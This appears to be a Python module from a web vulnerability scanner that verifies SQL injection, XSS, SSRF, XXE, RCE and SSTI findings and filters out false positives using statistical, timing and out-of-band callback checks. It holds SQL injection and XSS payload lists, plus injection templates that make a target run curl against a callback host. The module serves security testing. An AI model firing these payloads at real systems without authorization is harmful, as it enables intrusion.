#!/usr/bin/env python3
"""
高级漏洞验证器 - Advanced Vulnerability Verifier

扩展现有误报过滤器，增加：
- OOB (Out-of-Band) 回调验证
- 统计确认（多次请求交叉验证）
- Payload 变体确认
- 时间盲注统计验证

Usage:
    from core.detectors.advanced_verifier import AdvancedVerifier

    verifier = AdvancedVerifier()

    # 统计确认
    result = verifier.statistical_confirm(
        url="https://target.com/api?id=1",
        payloads=["1' AND 1=1--", "1' AND 1=2--"],
        request_func=make_request,
    )

    # OOB 验证
    result = verifier.oob_verify(
        finding={"type": "ssrf", "url": "..."},
        callback_server="https://oob.example.com",
    )
"""

import logging
import re
import statistics
import threading
import time
import uuid
from dataclasses import dataclass, field
from difflib import SequenceMatcher
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

from .false_positive_filter import DynamicContentNormalizer, FalsePositiveFilter

logger = logging.getLogger(__name__)


class VerificationStatus(Enum):
    """验证状态"""

    CONFIRMED = "confirmed"  # 已确认漏洞
    LIKELY = "likely"  # 很可能是漏洞
    UNCERTAIN = "uncertain"  # 不确定
    FALSE_POSITIVE = "false_positive"  # 确认为误报
    ERROR = "error"  # 验证过程出错


class VerificationMethod(Enum):
    """验证方法"""

    STATISTICAL = "statistical"  # 统计确认
    OOB_DNS = "oob_dns"  # DNS OOB
    OOB_HTTP = "oob_http"  # HTTP OOB
    PAYLOAD_VARIANT = "payload_variant"  # Payload 变体
    TIME_BASED = "time_based"  # 时间盲注
    ERROR_BASED = "error_based"  # 错误差异
    CONTENT_DIFF = "content_diff"  # 内容差异


@dataclass
class VerificationResult:
    """验证结果"""

    status: VerificationStatus
    method: VerificationMethod
    confidence: float  # 0-1
    evidence: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "status": self.status.value,
            "method": self.method.value,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "details": self.details,
        }


@dataclass
class OOBToken:
    """OOB 回调令牌"""

    token_id: str
    finding_type: str
    target: str
    created_at: float
    callback_url: str
    triggered: bool = False
    trigger_data: Optional[Dict[str, Any]] = None


class OOBCallbackManager:
    """OOB 回调管理器

    管理 DNS/HTTP 回调令牌的生成和验证
    """

    def __init__(self, callback_server: str = ""):
        self.callback_server = callback_server
        self._tokens: Dict[str, OOBToken] = {}
        self._lock = threading.Lock()

    def generate_token(
        self,
        finding_type: str,
        target: str,
        protocol: str = "dns",
    ) -> OOBToken:
        """生成 OOB 回调令牌

        Args:
            finding_type: 漏洞类型 (ssrf, xxe, rce, etc.)
            target: 目标
            protocol: 回调协议 (dns, http)

        Returns:
            OOBToken
        """
        with self._lock:
            # 自动清理过多令牌
            if len(self._tokens) > 1000:
                self._cleanup_expired_internal(max_age=60.0)

            token_id = uuid.uuid4().hex[:16]

            # 清理 finding_type 用于 DNS 回调 URL
            finding_type_sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', finding_type)

            if protocol == "dns":
                callback_url = f"{token_id}.{finding_type_sanitized}.{self.callback_server}"
            else:
                callback_url = f"{self.callback_server}/{token_id}"

            token = OOBToken(
                token_id=token_id,
                finding_type=finding_type,
                target=target,
                created_at=time.time(),
                callback_url=callback_url,
            )

            self._tokens[token_id] = token
            return token

    def check_callback(self, token_id: str) -> bool:
        """检查令牌是否已触发

        在实际部署中，这会查询 callback server 的日志。
        这里提供接口，实际回调检查通过 mark_triggered 注入。
        """
        with self._lock:
            token = self._tokens.get(token_id)
            if not token:
                return False
            return token.triggered

    def mark_triggered(
        self,
        token_id: str,
        trigger_data: Optional[Dict[str, Any]] = None,
    ) -> bool:
        """标记令牌已触发（由回调服务器调用）"""
        with self._lock:
            token = self._tokens.get(token_id)
            if not token:
                return False

            token.triggered = True
            token.trigger_data = trigger_data or {}
            return True

    def get_token(self, token_id: str) -> Optional[OOBToken]:
        """获取令牌"""
        with self._lock:
            return self._tokens.get(token_id)

    def _cleanup_expired_internal(self, max_age: float = 300.0):
        """内部清理过期令牌（假设已持有锁）"""
        now = time.time()
        expired = [
            tid for tid, t in self._tokens.items()
            if now - t.created_at > max_age
        ]
        for tid in expired:
            del self._tokens[tid]

    def cleanup_expired(self, max_age: float = 300.0):
        """清理过期令牌（线程安全）"""
        with self._lock:
            self._cleanup_expired_internal(max_age)

    @property
    def token_count(self) -> int:
        with self._lock:
            return len(self._tokens)


class PayloadVariantGenerator:
    """Payload 变体生成器

    生成同类型但不同形式的 payload 用于交叉验证
    """

    # SQLi payload 变体组
    SQLI_VARIANTS = {
        "true_condition": [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' OR 'a'='a",
            "1 OR 1=1",
        ],
        "false_condition": [
            "' AND '1'='2",
            "' AND 1=2--",
            "\" AND \"1\"=\"2",
            "' AND 'a'='b",
            "1 AND 1=2",
        ],
        "error_trigger": [
            "'",
            "\"",
            "' OR ''='",
            "1'",
            "1\"",
        ],
        "time_based": [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1; SELECT SLEEP(5)",
        ],
    }

    # XSS payload 变体组
    XSS_VARIANTS = {
        "basic": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
        ],
        "encoded": [
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
        ],
        "attribute": [
            '" onmouseover="alert(1)',
            "' onload='alert(1)",
            '" onfocus="alert(1)" autofocus="',
        ],
    }

    def get_variants(
        self, vuln_type: str, variant_group: str = "basic"
    ) -> List[str]:
        """获取 payload 变体

        Args:
            vuln_type: 漏洞类型 (sqli, xss)
            variant_group: 变体组

        Returns:
            payload 列表
        """
        variants_map = {
            "sqli": self.SQLI_VARIANTS,
            "xss": self.XSS_VARIANTS,
        }

        vuln_variants = variants_map.get(vuln_type, {})
        return vuln_variants.get(variant_group, [])

    def get_true_false_pairs(self, vuln_type: str) -> List[Tuple[str, str]]:
        """获取真/假条件 payload 对（用于布尔盲注验证）

        Returns:
            [(true_payload, false_payload), ...]
        """
        if vuln_type == "sqli":
            true_payloads = self.SQLI_VARIANTS.get("true_condition", [])
            false_payloads = self.SQLI_VARIANTS.get("false_condition", [])

            pairs = []
            for i in range(min(len(true_payloads), len(false_payloads))):
                pairs.append((true_payloads[i], false_payloads[i]))
            return pairs

        return []


class AdvancedVerifier:
    """高级漏洞验证器

    组合多种验证方法交叉确认漏洞

    Args:
        callback_server: OOB 回调服务器地址
    """

    def __init__(self, callback_server: str = ""):
        self.fp_filter = FalsePositiveFilter()
        self.normalizer = DynamicContentNormalizer()
        self.oob_manager = OOBCallbackManager(callback_server)
        self.payload_gen = PayloadVariantGenerator()

    def statistical_confirm(
        self,
        url: str,
        payloads: List[str],
        request_func: Callable,
        baseline_payload: str = "",
        num_trials: int = 3,
        similarity_threshold: float = 0.85,
    ) -> VerificationResult:
        """统计确认漏洞

        发送多次请求，比较 payload 和 baseline 的响应差异

        Args:
            url: 目标 URL
            payloads: 攻击 payload 列表
            request_func: 请求函数 (url, payload) -> (body, status, time)
            baseline_payload: 基线 payload（正常请求）
            num_trials: 每个 payload 的试验次数
            similarity_threshold: 相似度阈值

        Returns:
            VerificationResult
        """
        evidence = []

        # 收集基线响应
        baseline_responses = []
        for _ in range(num_trials):
            try:
                body, status, resp_time = request_func(url, baseline_payload)
                baseline_responses.append((body, status, resp_time))
            except Exception as e:
                logger.warning("基线请求失败: %s", e)

        if not baseline_responses:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.STATISTICAL,
                confidence=0.0,
                evidence=["基线请求全部失败"],
            )

        # 规范化基线
        baseline_normalized = [
            self.normalizer.normalize(r[0]) for r in baseline_responses
        ]
        baseline_statuses = [r[1] for r in baseline_responses]

        # 收集 payload 响应
        payload_diffs = []
        for payload in payloads:
            payload_responses = []
            for _ in range(num_trials):
                try:
                    body, status, resp_time = request_func(url, payload)
                    payload_responses.append((body, status, resp_time))
                except Exception as e:
                    logger.warning("Payload 请求失败: %s", e)

            if not payload_responses:
                continue

            # 比较 payload 响应与基线
            for pr_body, pr_status, pr_time in payload_responses:
                pr_normalized = self.normalizer.normalize(pr_body)

                # 与每个基线比较
                similarities = []
                for bl in baseline_normalized:
                    sim = SequenceMatcher(None, pr_normalized, bl).ratio()
                    similarities.append(sim)

                avg_sim = statistics.mean(similarities)
                status_diff = pr_status != baseline_statuses[0]

                payload_diffs.append({
                    "payload": payload[:50],
                    "similarity": avg_sim,
                    "status_diff": status_diff,
                    "status": pr_status,
                })

                if avg_sim < similarity_threshold:
                    evidence.append(
                        f"Payload '{payload[:30]}' 响应差异: sim={avg_sim:.2f}"
                    )

        if not payload_diffs:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.STATISTICAL,
                confidence=0.0,
                evidence=["所有 payload 请求失败"],
            )

        # 分析差异
        avg_similarity = statistics.mean([d["similarity"] for d in payload_diffs])
        status_diffs = sum(1 for d in payload_diffs if d["status_diff"])
        diff_ratio = status_diffs / len(payload_diffs) if payload_diffs else 0

        # 判定
        if avg_similarity < 0.5 or diff_ratio > 0.5:
            status = VerificationStatus.CONFIRMED
            confidence = min(1.0 - avg_similarity + diff_ratio * 0.3, 1.0)
        elif avg_similarity < similarity_threshold:
            status = VerificationStatus.LIKELY
            confidence = 1.0 - avg_similarity
        else:
            status = VerificationStatus.FALSE_POSITIVE
            confidence = avg_similarity

        return VerificationResult(
            status=status,
            method=VerificationMethod.STATISTICAL,
            confidence=confidence,
            evidence=evidence,
            details={
                "avg_similarity": avg_similarity,
                "status_diff_ratio": diff_ratio,
                "num_payloads": len(payloads),
                "num_trials": num_trials,
                "diffs": payload_diffs,
            },
        )

    def boolean_blind_confirm(
        self,
        url: str,
        vuln_type: str,
        request_func: Callable,
        num_trials: int = 3,
    ) -> VerificationResult:
        """布尔盲注确认

        通过 true/false payload 对的响应差异确认盲注

        Args:
            url: 目标 URL
            vuln_type: 漏洞类型
            request_func: 请求函数 (url, payload) -> (body, status, time)
            num_trials: 试验次数
        """
        pairs = self.payload_gen.get_true_false_pairs(vuln_type)
        if not pairs:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.CONTENT_DIFF,
                confidence=0.0,
                evidence=[f"无可用的 {vuln_type} true/false payload 对"],
            )

        evidence = []
        consistent_diffs = 0
        total_tests = 0

        for true_payload, false_payload in pairs:
            true_responses = []
            false_responses = []

            for _ in range(num_trials):
                try:
                    t_body, t_status, t_time = request_func(url, true_payload)
                    f_body, f_status, f_time = request_func(url, false_payload)
                    true_responses.append((t_body, t_status))
                    false_responses.append((f_body, f_status))
                except Exception:
                    continue

            if not true_responses or not false_responses:
                continue

            # 比较 true/false 响应
            for (t_body, t_status), (f_body, f_status) in zip(
                true_responses, false_responses
            ):
                total_tests += 1

                t_norm = self.normalizer.normalize(t_body)
                f_norm = self.normalizer.normalize(f_body)

                sim = SequenceMatcher(None, t_norm, f_norm).ratio()

                # true 和 false 响应应该不同
                if sim < 0.9 or t_status != f_status:
                    consistent_diffs += 1
                    evidence.append(
                        f"True/False 差异: sim={sim:.2f}, "
                        f"status={t_status}/{f_status}"
                    )

        if total_tests == 0:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.CONTENT_DIFF,
                confidence=0.0,
                evidence=["无有效测试结果"],
            )

        diff_ratio = consistent_diffs / total_tests

        if diff_ratio >= 0.8:
            status = VerificationStatus.CONFIRMED
            confidence = min(diff_ratio, 0.95)
        elif diff_ratio >= 0.5:
            status = VerificationStatus.LIKELY
            confidence = diff_ratio * 0.8
        else:
            status = VerificationStatus.FALSE_POSITIVE
            confidence = 1.0 - diff_ratio

        return VerificationResult(
            status=status,
            method=VerificationMethod.CONTENT_DIFF,
            confidence=confidence,
            evidence=evidence,
            details={
                "consistent_diffs": consistent_diffs,
                "total_tests": total_tests,
                "diff_ratio": diff_ratio,
                "pairs_tested": len(pairs),
            },
        )

    def time_based_confirm(
        self,
        url: str,
        delay_payloads: List[str],
        request_func: Callable,
        expected_delay: float = 5.0,
        num_trials: int = 3,
    ) -> VerificationResult:
        """时间盲注确认

        通过响应时间差异确认时间盲注

        Args:
            url: 目标 URL
            delay_payloads: 延迟 payload 列表
            request_func: 请求函数 (url, payload) -> (body, status, time)
            expected_delay: 预期延迟秒数
            num_trials: 试验次数
        """
        evidence = []

        # 收集基线响应时间
        baseline_times = []
        for _ in range(num_trials):
            try:
                _, _, resp_time = request_func(url, "")
                baseline_times.append(resp_time)
            except Exception:
                pass

        if not baseline_times:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.TIME_BASED,
                confidence=0.0,
                evidence=["基线请求失败"],
            )

        baseline_mean = statistics.mean(baseline_times)
        baseline_std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0

        # 收集延迟 payload 响应时间
        delayed_results = []
        for payload in delay_payloads:
            payload_times = []
            for _ in range(num_trials):
                try:
                    _, _, resp_time = request_func(url, payload)
                    payload_times.append(resp_time)
                except Exception:
                    pass

            if payload_times:
                payload_mean = statistics.mean(payload_times)
                delay_detected = payload_mean > baseline_mean + expected_delay * 0.7

                delayed_results.append({
                    "payload": payload[:50],
                    "mean_time": payload_mean,
                    "delayed": delay_detected,
                })

                if delay_detected:
                    evidence.append(
                        f"延迟检测: baseline={baseline_mean:.1f}s, "
                        f"payload={payload_mean:.1f}s"
                    )

        if not delayed_results:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.TIME_BASED,
                confidence=0.0,
                evidence=["延迟 payload 请求全部失败"],
            )

        # 使用现有过滤器检查误报
        all_times = []
        for dr in delayed_results:
            all_times.append(dr["mean_time"])

        is_fp, fp_reason = self.fp_filter.filter_time_based_false_positive(
            all_times, expected_delay
        )

        delayed_count = sum(1 for d in delayed_results if d["delayed"])
        delay_ratio = delayed_count / len(delayed_results)

        # 网络波动检查
        if baseline_std > baseline_mean * 0.3:
            evidence.append(f"网络不稳定: baseline_std={baseline_std:.2f}s")
            confidence_penalty = 0.3
        else:
            confidence_penalty = 0.0

        if is_fp:
            status = VerificationStatus.FALSE_POSITIVE
            confidence = 0.7
            evidence.append(f"时间盲注误报检测: {fp_reason}")
        elif delay_ratio >= 0.7:
            status = VerificationStatus.CONFIRMED
            confidence = min(delay_ratio - confidence_penalty, 0.95)
        elif delay_ratio >= 0.4:
            status = VerificationStatus.LIKELY
            confidence = max(delay_ratio * 0.8 - confidence_penalty, 0.1)
        else:
            status = VerificationStatus.FALSE_POSITIVE
            confidence = 1.0 - delay_ratio

        return VerificationResult(
            status=status,
            method=VerificationMethod.TIME_BASED,
            confidence=max(confidence, 0.0),
            evidence=evidence,
            details={
                "baseline_mean": baseline_mean,
                "baseline_std": baseline_std,
                "delayed_count": delayed_count,
                "total_payloads": len(delayed_results),
                "delay_ratio": delay_ratio,
                "fp_check": fp_reason if is_fp else None,
            },
        )

    def oob_verify(
        self,
        finding_type: str,
        target: str,
        protocol: str = "dns",
    ) -> Tuple[OOBToken, str]:
        """生成 OOB 验证 payload

        Args:
            finding_type: 漏洞类型
            target: 目标
            protocol: 回调协议

        Returns:
            (token, payload_to_inject)
        """
        token = self.oob_manager.generate_token(
            finding_type=finding_type,
            target=target,
            protocol=protocol,
        )

        # 根据漏洞类型生成注入 payload
        payload_templates = {
            "ssrf": f"http://{token.callback_url}",
            "xxe": f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{token.callback_url}'>]>",
            "rce": f"curl http://{token.callback_url}",
            "ssti": f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('/usr/bin/curl http://{token.callback_url}').read()}}}}",
        }

        payload = payload_templates.get(
            finding_type,
            f"http://{token.callback_url}",
        )

        return token, payload

    def check_oob_result(self, token_id: str) -> VerificationResult:
        """检查 OOB 验证结果

        Args:
            token_id: 令牌 ID

        Returns:
            VerificationResult
        """
        token = self.oob_manager.get_token(token_id)
        if not token:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.OOB_DNS,
                confidence=0.0,
                evidence=["令牌不存在"],
            )

        if token.triggered:
            return VerificationResult(
                status=VerificationStatus.CONFIRMED,
                method=VerificationMethod.OOB_DNS
                if "." in token.callback_url and "/" not in token.callback_url
                else VerificationMethod.OOB_HTTP,
                confidence=0.95,
                evidence=[
                    f"OOB 回调已触发: {token.finding_type}",
                    f"目标: {token.target}",
                ],
                details=token.trigger_data or {},
            )

        # 检查是否超时
        elapsed = time.time() - token.created_at
        if elapsed > 60:
            return VerificationResult(
                status=VerificationStatus.UNCERTAIN,
                method=VerificationMethod.OOB_DNS,
                confidence=0.3,
                evidence=[f"OOB 回调超时 ({elapsed:.0f}s)"],
            )

        return VerificationResult(
            status=VerificationStatus.UNCERTAIN,
            method=VerificationMethod.OOB_DNS,
            confidence=0.3,
            evidence=["等待 OOB 回调..."],
        )

    def multi_method_verify(
        self,
        url: str,
        vuln_type: str,
        request_func: Callable,
        methods: Optional[List[str]] = None,
    ) -> Dict[str, VerificationResult]:
        """多方法交叉验证

        同时使用多种方法验证，综合判定

        Args:
            url: 目标 URL
            vuln_type: 漏洞类型
            request_func: 请求函数
            methods: 使用的验证方法列表

        Returns:
            {method_name: VerificationResult}
        """
        methods = methods or ["statistical", "boolean_blind"]
        results = {}

        if "statistical" in methods:
            variants = self.payload_gen.get_variants(vuln_type, "basic")
            if variants:
                results["statistical"] = self.statistical_confirm(
                    url=url,
                    payloads=variants[:3],
                    request_func=request_func,
                )

        if "boolean_blind" in methods:
            results["boolean_blind"] = self.boolean_blind_confirm(
                url=url,
                vuln_type=vuln_type,
                request_func=request_func,
            )

        if "time_based" in methods:
            time_payloads = self.payload_gen.get_variants(vuln_type, "time_based")
            if time_payloads:
                results["time_based"] = self.time_based_confirm(
                    url=url,
                    delay_payloads=time_payloads[:2],
                    request_func=request_func,
                )

        return results

    def aggregate_results(
        self, results: Dict[str, VerificationResult]
    ) -> VerificationResult:
        """聚合多方法验证结果

        Args:
            results: 各方法的验证结果

        Returns:
            综合判定结果
        """
        if not results:
            return VerificationResult(
                status=VerificationStatus.ERROR,
                method=VerificationMethod.STATISTICAL,
                confidence=0.0,
                evidence=["无验证结果"],
            )

        confirmed_count = sum(
            1 for r in results.values()
            if r.status == VerificationStatus.CONFIRMED
        )
        likely_count = sum(
            1 for r in results.values()
            if r.status == VerificationStatus.LIKELY
        )
        fp_count = sum(
            1 for r in results.values()
            if r.status == VerificationStatus.FALSE_POSITIVE
        )
        total = len(results)

        # 综合所有证据
        all_evidence = []
        for method, result in results.items():
            all_evidence.extend(
                [f"[{method}] {e}" for e in result.evidence]
            )

        # 加权判定
        if confirmed_count > 0 and confirmed_count >= total * 0.5:
            status = VerificationStatus.CONFIRMED
            confidence = min(
                statistics.mean([r.confidence for r in results.values()
                                 if r.status == VerificationStatus.CONFIRMED]),
                0.95,
            )
        elif (confirmed_count + likely_count) > fp_count:
            status = VerificationStatus.LIKELY
            confidence = statistics.mean([r.confidence for r in results.values()])
        elif fp_count > (confirmed_count + likely_count):
            status = VerificationStatus.FALSE_POSITIVE
            confidence = statistics.mean([r.confidence for r in results.values()
                                          if r.status == VerificationStatus.FALSE_POSITIVE])
        else:
            status = VerificationStatus.UNCERTAIN
            confidence = 0.5

        return VerificationResult(
            status=status,
            method=VerificationMethod.STATISTICAL,  # 综合方法
            confidence=confidence,
            evidence=all_evidence,
            details={
                "confirmed": confirmed_count,
                "likely": likely_count,
                "false_positive": fp_count,
                "methods_used": list(results.keys()),
            },
        )
